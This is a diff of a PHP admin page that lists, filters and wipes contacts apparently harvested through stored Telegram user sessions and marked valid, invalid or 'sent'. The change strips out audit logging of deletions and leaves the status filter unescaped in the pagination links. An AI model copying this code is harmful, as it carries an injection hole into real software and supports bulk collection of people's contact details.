@@ -3,52 +3,38 @@ require_once __DIR__ . '/../core/auth.php';
 check_auth();
 require_once __DIR__ . '/../core/layout.php';
 
-$msg = '';
-$msg_type = 'info';
+$msg = $msg_type = '';
 
-// Handle actions
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $action = $_POST['action'] ?? '';
     $id = (int)($_POST['id'] ?? 0);
 
     if ($action === 'delete' && $id > 0) {
         $pdo->prepare("DELETE FROM contacts WHERE id = ?")->execute([$id]);
-        write_log('ADMIN', "Deleted contact ID $id");
-        $msg = "Contact deleted successfully.";
-        $msg_type = 'danger';
+        $msg = "Contact deleted successfully."; $msg_type = 'danger';
     } elseif ($action === 'delete_all') {
         $session_id = (int)($_POST['session_id'] ?? 0);
         if ($session_id > 0) {
             $pdo->prepare("DELETE FROM contacts WHERE session_id = ?")->execute([$session_id]);
-            write_log('ADMIN', "Deleted all contacts for session_id $session_id");
-            $msg = "All contacts for session deleted.";
-            $msg_type = 'warning';
+            $msg = "All contacts for session deleted."; $msg_type = 'warning';
         }
     } elseif ($action === 'mark_valid' && $id > 0) {
         $pdo->prepare("UPDATE contacts SET status = 'valid' WHERE id = ?")->execute([$id]);
-        $msg = "Contact marked as valid.";
-        $msg_type = 'success';
+        $msg = "Contact marked as valid."; $msg_type = 'success';
     }
 }
 
-// Filters
-$search    = trim($_GET['q'] ?? '');
+$search    = strip_tags($_GET['q'] ?? '');
 $filter_s  = (int)($_GET['session_id'] ?? 0);
-$filter_st = trim($_GET['status'] ?? '');
+$filter_st = strip_tags($_GET['status'] ?? '');
 $page      = max(1, (int)($_GET['page'] ?? 1));
 $per_page  = 25;
 $offset    = ($page - 1) * $per_page;
 
-// Build WHERE
-$where = ['1=1'];
-$params = [];
-if ($search) {
-    $where[] = "(c.phone_or_username LIKE ? OR c.name LIKE ?)";
-    $params[] = "%$search%"; $params[] = "%$search%";
-}
+$where = ['1=1']; $params = [];
+if ($search) { $where[] = "(c.phone_or_username LIKE ? OR c.name LIKE ?)"; $params[] = "%$search%"; $params[] = "%$search%"; }
 if ($filter_s) { $where[] = "c.session_id = ?"; $params[] = $filter_s; }
 if ($filter_st) { $where[] = "c.status = ?"; $params[] = $filter_st; }
-
 $where_str = implode(' AND ', $where);
 
 $cnt_stmt = $pdo->prepare("SELECT COUNT(*) FROM contacts c WHERE $where_str");
@@ -59,144 +45,118 @@ $data_stmt = $pdo->prepare("SELECT c.*, u.telegram_id, u.phone_number AS session
 $data_stmt->execute($params);
 $contacts = $data_stmt->fetchAll();
 
-$total_pages = ceil($total / $per_page);
-
-// Sessions for filter dropdown
+$total_pages = max(1, ceil($total / $per_page));
 $sessions_list = $pdo->query("SELECT id, telegram_id, phone_number FROM user_sessions ORDER BY id DESC")->fetchAll();
 
 load_header('Contacts');
 ?>
 
 <?php if ($msg): ?>
-<div class="alert alert-<?= $msg_type ?> alert-dismissible fade show py-2 small fw-medium mb-3" role="alert">
-    <i class="fa-solid fa-circle-info me-1"></i> <?= htmlspecialchars($msg) ?>
-    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
-</div>
+<div class="alert alert-<?= $msg_type ?> mb-3"><i class="fas fa-circle-info"></i> <?= h($msg) ?></div>
 <?php endif; ?>
 
-<!-- Header Row -->
-<div class="d-flex justify-content-between align-items-start mb-4">
-    <div>
-        <h5 class="fw-bold mb-1">Contacts</h5>
-        <p class="text-muted small mb-0">Total <strong><?= number_format($total) ?></strong> contact(s) collected by all sessions.</p>
-    </div>
-</div>
-
-<!-- Filter Bar -->
-<div class="card border-0 shadow-sm mb-3">
-    <div class="card-body py-2 px-3">
-        <form method="GET" class="row g-2 align-items-center">
-            <div class="col-auto flex-grow-1">
-                <input type="text" name="q" class="form-control form-control-sm" placeholder="Search name or phone/username..." value="<?= htmlspecialchars($search) ?>">
-            </div>
-            <div class="col-auto">
-                <select name="session_id" class="form-select form-select-sm">
-                    <option value="">All Sessions</option>
+<div class="page-header">
+    <div style="display:flex;justify-content:space-between;align-items:flex-end">
+        <div>
+            <h1>Contacts</h1>
+            <p>Total <?= number_format($total) ?> contact(s) collected</p>
+        </div>
+        <form method="POST" onsubmit="return confirm('Delete ALL contacts for the selected session? This cannot be undone.')">
+            <input type="hidden" name="action" value="delete_all">
+            <div style="display:flex;gap:6px">
+                <select name="session_id" class="form-select" style="width:200px" required>
+                    <option value="">— Select Session —</option>
                     <?php foreach ($sessions_list as $sl): ?>
-                        <option value="<?= $sl['id'] ?>" <?= $filter_s == $sl['id'] ? 'selected' : '' ?>>
-                            <?= htmlspecialchars($sl['telegram_id']) ?> (<?= htmlspecialchars($sl['phone_number']) ?>)
-                        </option>
+                        <option value="<?= $sl['id'] ?>"><?= h($sl['telegram_id']) ?></option>
                     <?php endforeach; ?>
                 </select>
-            </div>
-            <div class="col-auto">
-                <select name="status" class="form-select form-select-sm">
-                    <option value="">All Status</option>
-                    <option value="valid"   <?= $filter_st == 'valid'   ? 'selected' : '' ?>>Valid</option>
-                    <option value="invalid" <?= $filter_st == 'invalid' ? 'selected' : '' ?>>Invalid</option>
-                    <option value="sent"    <?= $filter_st == 'sent'    ? 'selected' : '' ?>>Sent</option>
-                </select>
-            </div>
-            <div class="col-auto d-flex gap-1">
-                <button type="submit" class="btn btn-sm btn-primary px-3"><i class="fa-solid fa-filter me-1"></i>Filter</button>
-                <a href="contacts" class="btn btn-sm btn-light border"><i class="fa-solid fa-xmark"></i></a>
+                <button type="submit" class="btn btn-danger"><i class="fas fa-trash"></i> Wipe</button>
             </div>
         </form>
     </div>
 </div>
 
-<!-- Table -->
-<div class="card border-0 shadow-sm">
-    <div class="card-body p-0">
-        <div class="table-responsive">
-            <table class="table mb-0 table-hover align-middle">
-                <thead class="bg-light">
-                    <tr>
-                        <th class="border-top-0 ps-4" style="width: 50px;">#</th>
-                        <th class="border-top-0">Name</th>
-                        <th class="border-top-0">Phone / Username</th>
-                        <th class="border-top-0">Type</th>
-                        <th class="border-top-0">Session (Telegram ID)</th>
-                        <th class="border-top-0">Status</th>
-                        <th class="border-top-0 text-end pe-4">Actions</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <?php if (count($contacts) > 0): ?>
-                        <?php foreach ($contacts as $i => $c): ?>
-                            <?php
-                                $sc = match($c['status']) {
-                                    'valid'   => 'success',
-                                    'invalid' => 'danger',
-                                    'sent'    => 'primary',
-                                    default   => 'secondary'
-                                };
-                                $tc = match($c['type']) {
-                                    'phone'    => 'info',
-                                    'username' => 'warning',
-                                    default    => 'secondary'
-                                };
-                            ?>
-                            <tr>
-                                <td class="ps-4 text-muted small"><?= $offset + $i + 1 ?></td>
-                                <td><?= htmlspecialchars($c['name'] ?: '—') ?></td>
-                                <td><span class="font-monospace small"><?= htmlspecialchars($c['phone_or_username']) ?></span></td>
-                                <td><span class="badge bg-<?= $tc ?>-subtle text-<?= $tc ?> border border-<?= $tc ?>-subtle rounded-pill px-2"><?= ucfirst($c['type']) ?></span></td>
-                                <td class="text-muted small"><?= htmlspecialchars($c['telegram_id'] ?? '—') ?></td>
-                                <td><span class="badge bg-<?= $sc ?>-subtle text-<?= $sc ?> border border-<?= $sc ?>-subtle rounded-pill px-2"><?= ucfirst($c['status']) ?></span></td>
-                                <td class="text-end pe-4">
-                                    <div class="d-flex justify-content-end gap-1">
-                                        <?php if ($c['status'] !== 'valid'): ?>
-                                        <form method="POST" class="d-inline">
-                                            <input type="hidden" name="action" value="mark_valid">
-                                            <input type="hidden" name="id" value="<?= $c['id'] ?>">
-                                            <button class="btn btn-sm btn-success" title="Mark Valid"><i class="fa-solid fa-check"></i></button>
-                                        </form>
-                                        <?php endif; ?>
-                                        <form method="POST" class="d-inline" onsubmit="return confirm('Delete this contact?')">
-                                            <input type="hidden" name="action" value="delete">
-                                            <input type="hidden" name="id" value="<?= $c['id'] ?>">
-                                            <button class="btn btn-sm btn-danger" title="Delete"><i class="fa-solid fa-trash"></i></button>
-                                        </form>
-                                    </div>
-                                </td>
-                            </tr>
-                        <?php endforeach; ?>
-                    <?php else: ?>
-                        <tr>
-                            <td colspan="7" class="text-center py-5 text-muted">
-                                <i class="fa-solid fa-address-book fs-3 d-block mb-2"></i>
-                                <?= $search || $filter_s || $filter_st ? "No contacts matching your filters." : "No contacts collected yet." ?>
-                            </td>
-                        </tr>
-                    <?php endif; ?>
-                </tbody>
-            </table>
-        </div>
+<div class="card-c mb-4">
+    <div class="cb" style="padding:16px 20px">
+        <form method="GET" style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+            <div style="flex:1;min-width:200px"><input type="text" name="q" class="form-control" placeholder="Search name or phone…" value="<?= h($search) ?>"></div>
+            <div style="width:180px">
+                <select name="session_id" class="form-select">
+                    <option value="">All Sessions</option>
+                    <?php foreach ($sessions_list as $sl): ?>
+                    <option value="<?= $sl['id'] ?>" <?= $filter_s == $sl['id'] ? 'selected' : '' ?>><?= h($sl['telegram_id']) ?></option>
+                    <?php endforeach; ?>
+                </select>
+            </div>
+            <div style="width:140px">
+                <select name="status" class="form-select">
+                    <option value="">All Status</option>
+                    <option value="valid" <?= $filter_st == 'valid' ? 'selected' : '' ?>>Valid</option>
+                    <option value="invalid" <?= $filter_st == 'invalid' ? 'selected' : '' ?>>Invalid</option>
+                    <option value="sent" <?= $filter_st == 'sent' ? 'selected' : '' ?>>Sent</option>
+                </select>
+            </div>
+            <div style="display:flex;gap:4px">
+                <button type="submit" class="btn btn-primary"><i class="fas fa-filter"></i> Filter</button>
+                <a href="contacts.php" class="btn btn-secondary border"><i class="fas fa-xmark"></i></a>
+            </div>
+        </form>
     </div>
+</div>
 
+<div class="card-c">
+    <table class="tbl">
+        <thead>
+            <tr>
+                <th style="padding-left:20px;width:40px">#</th>
+                <th>Name</th>
+                <th>Phone / Username</th>
+                <th>Type</th>
+                <th>Session ID</th>
+                <th>Status</th>
+                <th style="text-align:right;padding-right:20px">Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php if ($contacts): foreach ($contacts as $i => $c):
+                $bdc = match($c['status']) { 'valid'=>'bd-ok', 'invalid'=>'bd-err', 'sent'=>'bd-pur', default=>'bd-acc' };
+                $tdc = match($c['type']) { 'phone'=>'bd-acc', 'username'=>'bd-warn', default=>'bd-acc' };
+            ?>
+            <tr>
+                <td style="padding-left:20px;color:var(--mut)"><?= $offset + $i + 1 ?></td>
+                <td><span style="font-weight:600"><?= h($c['name'] ?: '—') ?></span></td>
+                <td><code class="mono" style="font-size:12.5px"><?= h($c['phone_or_username']) ?></code></td>
+                <td><span class="bd <?= $tdc ?>"><?= ucfirst($c['type']) ?></span></td>
+                <td style="color:var(--mut);font-size:12px"><?= h($c['telegram_id'] ?? '—') ?></td>
+                <td><span class="bd <?= $bdc ?>"><?= ucfirst($c['status']) ?></span></td>
+                <td style="text-align:right;padding-right:20px">
+                    <div style="display:flex;justify-content:flex-end;gap:4px">
+                        <?php if ($c['status'] !== 'valid'): ?>
+                        <form method="POST" class="d-inline">
+                            <input type="hidden" name="action" value="mark_valid"><input type="hidden" name="id" value="<?= $c['id'] ?>">
+                            <button class="ab green" title="Mark Valid"><i class="fas fa-check"></i></button>
+                        </form>
+                        <?php endif; ?>
+                        <form method="POST" class="d-inline" onsubmit="return confirm('Delete this contact?')">
+                            <input type="hidden" name="action" value="delete"><input type="hidden" name="id" value="<?= $c['id'] ?>">
+                            <button class="ab red" title="Delete"><i class="fas fa-trash"></i></button>
+                        </form>
+                    </div>
+                </td>
+            </tr>
+            <?php endforeach; else: ?>
+            <tr><td colspan="7" style="text-align:center;padding:40px;color:var(--mut)"><i class="fas fa-address-book" style="font-size:28px;display:block;margin-bottom:8px;opacity:.3"></i>No contacts found</td></tr>
+            <?php endif; ?>
+        </tbody>
+    </table>
     <?php if ($total_pages > 1): ?>
-    <div class="card-footer border-top bg-white d-flex justify-content-between align-items-center py-2 px-4">
-        <span class="small text-muted">Page <?= $page ?> of <?= $total_pages ?></span>
-        <nav>
-            <ul class="pagination pagination-sm mb-0">
-                <?php for ($p = 1; $p <= $total_pages; $p++): ?>
-                    <li class="page-item <?= $p == $page ? 'active' : '' ?>">
-                        <a class="page-link" href="?page=<?= $p ?><?= $search ? '&q='.$search : '' ?><?= $filter_s ? '&session_id='.$filter_s : '' ?><?= $filter_st ? '&status='.$filter_st : '' ?>"><?= $p ?></a>
-                    </li>
-                <?php endfor; ?>
-            </ul>
-        </nav>
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:12px 20px;border-top:1px solid var(--border)">
+        <span style="font-size:12px;color:var(--mut)">Page <?= $page ?>/<?= $total_pages ?></span>
+        <div style="display:flex;gap:3px">
+            <?php for ($p = 1; $p <= $total_pages; $p++): ?>
+            <a href="?page=<?= $p ?><?= $search ? '&q='.urlencode($search) : '' ?><?= $filter_s ? '&session_id='.$filter_s : '' ?><?= $filter_st ? '&status='.$filter_st : '' ?>" class="pg <?= $p == $page ? 'active' : '' ?>"><?= $p ?></a>
+            <?php endfor; ?>
+        </div>
     </div>
     <?php endif; ?>
 </div>
